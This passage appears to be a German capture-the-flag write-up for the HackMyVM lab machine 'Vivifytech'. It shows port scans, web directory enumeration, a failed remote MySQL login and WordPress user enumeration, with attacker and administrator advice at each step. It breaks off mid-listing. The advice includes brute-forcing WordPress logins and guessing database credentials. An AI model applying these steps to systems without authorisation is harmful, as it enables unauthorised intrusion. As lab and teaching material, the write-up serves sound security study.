@@ -1,0 +1,1171 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vivifytech - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>Vivifytech - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (sollte für Easy grün sein) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tool-Liste aus dem Text extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">sqlmap</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">git</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.117	08:00:27:37:cf:67	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` sendet ARP-Anfragen ins lokale Netzwerk, um aktive Geräte zu identifizieren. Es listet IP-Adressen, MAC-Adressen und oft den Hersteller der Netzwerkkarte auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich wurde die IP-Adresse `192.168.2.117` als aktives Ziel im Netzwerk gefunden. Die MAC-Adresse `08:00:27:37:cf:67` und der Hersteller `PCS Systemtechnik GmbH` deuten stark auf eine VirtualBox-Umgebung hin. Dies ist der erste Schritt zur Zielidentifikation.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP `192.168.2.117` ist das primäre Ziel für weitere Scans und Enumerationsschritte. Die Information über VirtualBox kann bei der späteren Exploit-Auswahl oder OS-Fingerprinting nützlich sein.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerk-Scans wie dieser sind üblich. Stellen Sie durch Netzwerksegmentierung und Intrusion Detection Systeme (IDS) sicher, dass nur autorisierte Scans stattfinden und ungewöhnliche Aktivitäten erkannt werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+# Inhalt der /etc/hosts Datei nach der Bearbeitung:
+127.0.0.1	localhost
+192.168.2.117   vivi.hmv
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei auf dem Angreifersystem wird mit dem `vi`-Editor bearbeitet. Der Eintrag `192.168.2.117 vivi.hmv` wird hinzugefügt. Dies weist das Betriebssystem an, den Hostnamen `vivi.hmv` direkt auf die IP-Adresse `192.168.2.117` aufzulösen, ohne einen DNS-Server zu bemühen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein praktischer Schritt, um die Interaktion mit dem Zielsystem zu vereinfachen. Viele Webanwendungen reagieren unterschiedlich, je nachdem, ob sie über die IP-Adresse oder einen spezifischen Hostnamen angesprochen werden (Virtual Hosting). Die Verwendung eines konsistenten Hostnamens (`vivi.hmv`) in den folgenden Schritten verbessert die Lesbarkeit und vermeidet potenzielle Konfigurationsprobleme.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Es ist gute Praxis, identifizierte IPs in die Hosts-Datei einzutragen, besonders wenn Webserver beteiligt sind. Verwenden Sie den definierten Hostnamen (`vivi.hmv`) für alle weiteren Web-Interaktionen.
+             <br><strong>Empfehlung (Admin):</strong> Dies ist eine reine Konfigurationsänderung auf dem Angreifer-PC und hat keine direkten Auswirkungen auf das Zielsystem. Es zeigt jedoch, dass Angreifer versuchen könnten, auf Dienste zuzugreifen, die auf bestimmte Hostnamen konfiguriert sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.117 -p- | grep open</span></div>
+                     <pre>
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+3306/tcp  open  mysql   MySQL (unauthorized)
+33060/tcp open  mysqlx?
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `nmap`-Scan wird durchgeführt, um offene TCP-Ports auf dem Ziel `192.168.2.117` zu finden.
+                <ul>
+                    <li>`-sS`: SYN-Scan (Stealth-Scan).</li>
+                    <li>`-sV`: Ermittelt Dienstversionen.</li>
+                    <li>`-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.</li>
+                    <li>`-T5`: Sehr schnelles Timing (aggressiv).</li>
+                    <li>`-p-`: Scannt alle 65535 TCP-Ports.</li>
+                    <li>`| grep open`: Filtert die Ausgabe, um nur offene Ports anzuzeigen.</li>
+                </ul></p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert vier offene Ports:
+                <ul>
+                    <li>**22/tcp:** SSH (OpenSSH 9.2p1 auf Debian) - Standardport für sichere Fernwartung.</li>
+                    <li>**80/tcp:** HTTP (Apache 2.4.57 auf Debian) - Standardport für Webserver.</li>
+                    <li>**3306/tcp:** MySQL - Standardport für MySQL-Datenbanken. Die Markierung "(unauthorized)" deutet darauf hin, dass Nmap zwar den Port als offen erkennt, aber ohne Anmeldedaten keine erfolgreiche Verbindung zur Versionserkennung herstellen konnte (oder der Zugriff von dieser IP nicht erlaubt ist).</li>
+                    <li>**33060/tcp:** MySQL X Protocol? - Ein alternativer Port für MySQL, der das X Protocol verwendet (oft für Document Store-Funktionen und moderne Clients). Nmap ist sich bei der Dienstidentifikation unsicher (`mysqlx?`).</li>
+                </ul>
+             Dieser schnelle Überblick zeigt die Hauptangriffsvektoren: SSH, Webserver und die MySQL-Datenbank.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie jeden offenen Port genauer. Analysieren Sie die Webanwendung auf Port 80. Versuchen Sie, sich mit der MySQL-Datenbank auf Port 3306 zu verbinden (z.B. mit Standard-Credentials oder als anonymer Benutzer). Recherchieren Sie den Dienst auf Port 33060. Prüfen Sie die SSH-Version auf bekannte Schwachstellen.
+             <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle offenen Ports notwendig sind. Beschränken Sie den Zugriff auf die Datenbank (Port 3306 und 33060) nur auf notwendige Systeme (z.B. den Webserver selbst). Verwenden Sie Firewalls, um den Zugriff auf alle Dienste einzuschränken. Halten Sie alle Dienste (SSH, Apache, MySQL) auf dem neuesten Stand.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.117 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-06 21:52 CEST
+Nmap scan report for vivi.hmv (192.168.2.117)
+Host is up (0.00015s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
+| ssh-hostkey:
+|   256 32:f3:f6:36:95:12:c8:18:f3:ad:b8:0f:04:4d:73:2f (ECDSA)
+|_  256 1d:ec:9c:6e:3c:cf:83:f6:f0:45:22:58:13:2f:d3:9e (ED25519)
+80/tcp    open  http    Apache httpd 2.4.57 ((Debian))
+|_http-server-header: Apache/2.4.57 (Debian)
+|_http-title: Apache2 Debian Default Page: It works
+3306/tcp  open  mysql   MySQL (unauthorized)
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|     HY000
+|   LDAPBindReq:
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns:
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.94SVN%I=7%D=5/6%Time=663934FB%P=x86_64-pc-linux-gnu%r
+SF:(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0
+SF:b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTP
+SF:ptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x
+SF:0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVe
+SF:rsionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP
+SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
+SF:fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
+SF:")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x
+SF:01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCook
+SF:ie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
+SF:\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x0
+SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
+SF:Y000")%r(FourhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStrin
+SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
+SF:"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x0
+SF:1\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20
+SF:message\"\x05HY000")%r(SIPptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(L
+SF:ANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\
+SF:0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Notes
+SF:RPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a
+SF:\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inval
+SF:id\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05
+SF:\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x
+SF:10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
+MAC Address: 08:00:27:37:CF:67 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.5
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms vivi.hmv (192.168.2.117)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.76 seconds
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des vorherigen `nmap`-Befehls. Sie liefert zusätzliche Details zu den offenen Ports und dem System.
+                <ul>
+                    <li>**Port 22 (SSH):** Bestätigt OpenSSH 9.2p1 auf Debian und zeigt die Host-Keys an.</li>
+                    <li>**Port 80 (HTTP):** Bestätigt Apache 2.4.57 auf Debian. Der Titel "Apache2 Debian Default Page: It works" deutet darauf hin, dass entweder keine benutzerdefinierte Webseite konfiguriert ist oder diese sich in einem Unterverzeichnis befindet.</li>
+                    <li>**Port 3306 (MySQL):** Wird als MySQL erkannt, aber Nmap konnte sich nicht authentifizieren (`unauthorized`).</li>
+                    <li>**Port 33060 (MySQL X?):** Nmap konnte den Dienst nicht eindeutig identifizieren (`mysqlx?`) und gibt einen Fingerabdruck aus. Die Fehlermeldungen ("Invalid message", "Parse error") deuten darauf hin, dass die von Nmap gesendeten Probes vom Dienst nicht korrekt verstanden wurden, was oft bei proprietären oder neueren Protokollen passiert. Es ist sehr wahrscheinlich der MySQL X Protocol Port.</li>
+                    <li>**MAC-Adresse:** Bestätigt erneut VirtualBox.</li>
+                    <li>**Betriebssystem:** Nmap schätzt Linux Kernel 5.X (vermutlich 5.0 - 5.5).</li>
+                </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der detaillierte Scan bestätigt die offenen Ports und liefert genauere Versionsinformationen. Die Standard-Apache-Seite auf Port 80 ist ein wichtiger Hinweis darauf, dass die eigentliche Webanwendung möglicherweise in einem Unterverzeichnis liegt (z.B. `/wordpress`). Die Unsicherheit bei Port 33060 und die fehlgeschlagene Authentifizierung bei 3306 erfordern weitere manuelle Tests. Die OS-Information ist nützlich für potenzielle Kernel-Exploits, falls sich später kein anderer Weg findet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche Port 80 auf Unterverzeichnisse (z.B. mit `gobuster` oder `dirb`). Versuche, dich manuell mit MySQL auf Port 3306 mit Standard- oder schwachen Anmeldeinformationen zu verbinden (`mysql -h vivi.hmv -u root -p`, `mysql -h vivi.hmv -u admin -p`, etc.). Recherchiere Schwachstellen für OpenSSH 9.2p1 und Apache 2.4.57.
+            <br><strong>Empfehlung (Admin):</strong> Ersetzen Sie die Standard-Apache-Seite durch eine leere Seite oder eine spezifische Fehlerseite, um keine unnötigen Informationen preiszugeben. Härten Sie die MySQL-Konfiguration: Deaktivieren Sie Remote-Root-Login, verwenden Sie starke Passwörter, erlauben Sie Verbindungen nur von notwendigen IPs. Stellen Sie sicher, dass der Dienst auf Port 33060 (falls MySQL X) ebenfalls abgesichert ist oder deaktiviert wird, falls nicht benötigt.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.117</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.117
++ Target Hostname:    192.168.2.117
++ Target Port:        80
++ Start Time:         2024-05-06 21:52:24 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 60bc4bc0ba5e6, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .
++ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
++ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
++ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
++ /wordpress/: Drupal Link header found with value: <http://192.168.2.117/wordpress/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
++ /wordpress/: A Wordpress installation was found.
++ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
++ /wordpress/wp-content/uploads/: Directory indexing found.
++ /wordpress/wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
++ /wordpress/wp-login.php: Wordpress login found.
++ 8102 requests: 0 error(s) and 13 item(s) reported on remote host
++ End Time:           2024-05-06 21:52:46 (GMT2) (22 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `nikto` scannt den Webserver auf Port 80 nach bekannten Schwachstellen, Konfigurationsfehlern und interessanten Dateien/Verzeichnissen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nikto liefert entscheidende Informationen:
+                <ul>
+                    <li>Bestätigt Apache/2.4.57 (Debian).</li>
+                    <li>Meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`).</li>
+                    <li>Meldet mögliches ETag-Inode-Leak (altes Problem, geringes Risiko).</li>
+                    <li>**WICHTIG:** Identifiziert eine WordPress-Installation im Unterverzeichnis `/wordpress/`.</li>
+                    <li>Findet spezifische WordPress-Dateien (`wp-links-opml.php`, `wp-login.php`) und Verzeichnisse (`/wp-admin/`, `/wp-content/uploads/`).</li>
+                    <li>Meldet Directory Indexing im `/wordpress/wp-content/uploads/`-Verzeichnis, was das Durchsuchen hochgeladener Dateien ermöglicht.</li>
+                    <li>Findet einen Test-Cookie (`wordpress_test_cookie`) ohne `HttpOnly`-Flag auf der Registrierungsseite (`wp-login.php?action=register`), was auf potenzielle XSS-Risiken hindeutet.</li>
+                </ul>
+            Die Entdeckung der WordPress-Installation unter `/wordpress/` ist der wichtigste Fund dieses Scans und lenkt den Fokus der weiteren Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die weitere Enumeration auf das Verzeichnis `/wordpress/`. Verwenden Sie WordPress-spezifische Scanner wie `wpscan`. Untersuchen Sie das `/uploads`-Verzeichnis manuell auf interessante Dateien. Testen Sie `wp-login.php` auf Brute-Force und andere Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader. Deaktivieren Sie Directory Indexing, insbesondere für das `uploads`-Verzeichnis. Setzen Sie das `HttpOnly`-Flag für alle Cookies. Halten Sie WordPress, Themes und Plugins immer auf dem neuesten Stand. Beschränken Sie den Zugriff auf `wp-login.php` und `xmlrpc.php`, wenn möglich (z.B. durch IP-Whitelisting oder .htaccess).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://vivi.hmv</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Mon May  6 21:52:33 2024
+URL_BASE: http://vivi.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4622
+
+---- Scanning URL: http://vivi.hmv/ ----
++ http://vivi.hmv/index.html (CODE:200|SIZE:10701)
++ http://vivi.hmv/server-status (CODE:403|SIZE:273)
+==> DIRECTORY: http://vivi.hmv/wordpress/
+
+---- Entering directory: http://vivi.hmv/wordpress/ ----
++ http://vivi.hmv/wordpress/index.php (CODE:301|SIZE:0)
+==> DIRECTORY: http://vivi.hmv/wordpress/wp-admin/
+==> DIRECTORY: http://vivi.hmv/wordpress/wp-content/
+==> DIRECTORY: http://vivi.hmv/wordpress/wp-includes/
++ http://vivi.hmv/wordpress/xmlrpc.php (CODE:405|SIZE:42)
+[...]
+---- Entering directory: http://vivi.hmv/wordpress/wp-content/upgrade/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://vivi.hmv/wordpress/wp-content/uploads/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+[...]
+-----------------
+END_TIME: Mon May  6 21:53:22 2024
+DOWNLOADED: 36976 - FOUND: 13
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `dirb` wird verwendet, um nach häufig vorkommenden Verzeichnissen und Dateien auf dem Webserver zu suchen, beginnend im Root-Verzeichnis (`http://vivi.hmv/`). Es verwendet die Standard-Wortliste `common.txt`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `dirb` bestätigt schnell die Existenz des `/wordpress`-Verzeichnisses, das bereits von `nikto` identifiziert wurde. Es findet auch die Standard-`index.html` im Root und einen `/server-status`-Endpunkt, der jedoch verboten ist (Status 403). Wichtig ist, dass `dirb` rekursiv in das `/wordpress`-Verzeichnis wechselt und dort Standard-WordPress-Verzeichnisse (`wp-admin`, `wp-content`, `wp-includes`) und Dateien (`xmlrpc.php`) findet. Es bestätigt auch, dass die Verzeichnisse `/wp-content/upgrade/` und `/wp-content/uploads/` auflistbar sind (Directory Listing aktiviert).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Ergebnisse bestätigen den Fokus auf `/wordpress`. Die auflistbaren Verzeichnisse `/upgrade` und `/uploads` sollten manuell auf interessante Inhalte überprüft werden. Die Datei `xmlrpc.php` ist ein häufiges Ziel für Brute-Force-Angriffe auf WordPress.
+            <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Listing global oder zumindest für sensible Verzeichnisse wie `wp-content`, `uploads` und `upgrade`. Deaktivieren oder schützen Sie `xmlrpc.php`, wenn es nicht benötigt wird (z.B. über `.htaccess` oder Sicherheitsplugins).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://vivi.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.6
+[...]
+===============================================================
+[+] Url:                     http://vivi.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.6
+[+] Expanded:                true
+[+] Extensions:              [...]
+[+] Ignore TLS certificate errors: true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+http://vivi.hmv/index.html           (Status: 200) [Size: 10701]
+http://vivi.hmv/wordpress            (Status: 301) [Size: 308] [--> http://vivi.hmv/wordpress/]
+
+===============================================================
+Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird ähnlich wie `dirb` für die Verzeichnis- und Dateisuche eingesetzt, jedoch mit einer anderen Wortliste (`directory-list-2.3-medium.txt` aus SecLists) und der zusätzlichen Suche nach einer Vielzahl von Dateierweiterungen (`-x ...`). Es ignoriert 403- und 404-Antworten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser `gobuster`-Scan, der im Root-Verzeichnis (`/`) ausgeführt wird, findet keine neuen relevanten Verzeichnisse oder Dateien außer der bereits bekannten `index.html` und dem `/wordpress`-Verzeichnis (das auf `/wordpress/` weiterleitet). Dies verstärkt die Annahme, dass die Hauptanwendung unter `/wordpress/` liegt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie `gobuster` (oder `dirb`/`ffuf`) gezielt auf das Verzeichnis `http://vivi.hmv/wordpress/` aus, um spezifische WordPress-Dateien oder -Verzeichnisse zu finden, die von der Standardliste `common.txt` möglicherweise nicht abgedeckt wurden.
+            <br><strong>Empfehlung (Admin):</strong> Die Maßnahmen zur Verhinderung von Directory Enumeration (WAF, korrekte 404-Antworten) sind weiterhin relevant.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mysql -h vivi.hmv -u root -p</span></div>
+                     <pre>
+Enter password:
+ERROR 1130 (HY000): Host 'PC192-168-2-199' is not allowed to connect to this MySQL server
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit dem MySQL-Client auf dem Angreifersystem (vermutlich `192.168.2.199`, wie aus der Fehlermeldung hervorgeht) mit dem MySQL-Server auf `vivi.hmv` (Port 3306) als Benutzer `root` zu verbinden. Die Passwortabfrage wird angezeigt, aber die Verbindung scheitert, bevor ein Passwort eingegeben werden kann.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Fehlermeldung "Host 'PC192-168-2-199' is not allowed to connect to this MySQL server" ist eindeutig. Der MySQL-Server ist so konfiguriert, dass er Verbindungen vom Host des Angreifers (`192.168.2.199`) nicht akzeptiert, zumindest nicht für den Benutzer `root`. Dies ist eine gängige und empfohlene Sicherheitsmaßnahme.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Direkte MySQL-Verbindungen von extern scheinen blockiert zu sein. Der Zugriff auf die Datenbank muss wahrscheinlich über eine Schwachstelle in der Webanwendung (z.B. SQL Injection) oder von innerhalb des Zielsystems erfolgen, falls ein initialer Zugriff gelingt. Testen Sie, ob andere Benutzer (z.B. `admin`, `wordpress`, `sancelisso`) von extern erlaubt sind oder ob anonyme Logins möglich sind (unwahrscheinlich).
+             <br><strong>Empfehlung (Admin):</strong> Die Konfiguration, die externe Verbindungen (insbesondere für `root`) blockiert, ist korrekt und sollte beibehalten werden. Stellen Sie sicher, dass nur notwendige Benutzerkonten existieren und Verbindungen nur von vertrauenswürdigen Hosts (z.B. `localhost` für den Webserver) erlaubt sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Interaction / API Request]</div>
+                     <pre>
+# Angeforderte URL (vermutlich): http://vivi.hmv/wordpress/index.php/wp-json/wp/v2/users
+
+# Antwort (Auszug):
+[
+  {
+    "id": 1,
+    "name": "sancelisso",
+    "url": "http://192.168.177.133/wordpress",
+    "description": "",
+    "link": "http://vivi.hmv/wordpress/index.php/author/sancelisso/",
+    "slug": "sancelisso",
+    "avatar_urls": {
+      "24": "http://2.gravatar.com/avatar/e454f0d5fc9abacb5cb29fc76290a2c9?s=24&d=mm&r=g",
+      "48": "http://2.gravatar.com/avatar/e454f0d5fc9abacb5cb29fc76290a2c9?s=48&d=mm&r=g",
